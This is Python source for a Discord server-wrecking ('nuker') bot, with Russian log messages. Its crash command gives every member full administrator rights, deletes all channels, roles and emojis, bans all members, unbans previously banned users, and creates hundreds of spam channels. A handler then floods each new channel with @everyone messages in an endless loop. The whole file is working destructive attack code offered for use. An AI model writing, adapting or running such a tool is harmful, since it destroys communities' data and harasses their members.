import keep_alive
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os


SPAM_CHANNEL =  ["crashed by you"]
SPAM_MESSAGE = ["@everyone текст со спамом"]

client = commands.Bot(command_prefix="!")


@client.event
async def on_ready():
   print(''' 
   
работает

 ''')


@client.command()
async def crash(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "дал всем админку ахахах" + Fore.RESET)
    except:
      print(Fore.GREEN + "бля не получилось" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} был удален" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} не был удален" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} забанен" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} чет не забанился" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} удалена" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} не смогла удалиться" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} было удалено" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} чет не удалилось" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban()
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} был разбанен" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} чет не разбанился" + Fore.RESET)
    await guild.create_text_channel("crashed by you")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"уничтоженно {guild.name} успешно.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

keep_alive.keep_alive()
client.run(os.environ.get('TOKEN'), bot = True, reconnect = True)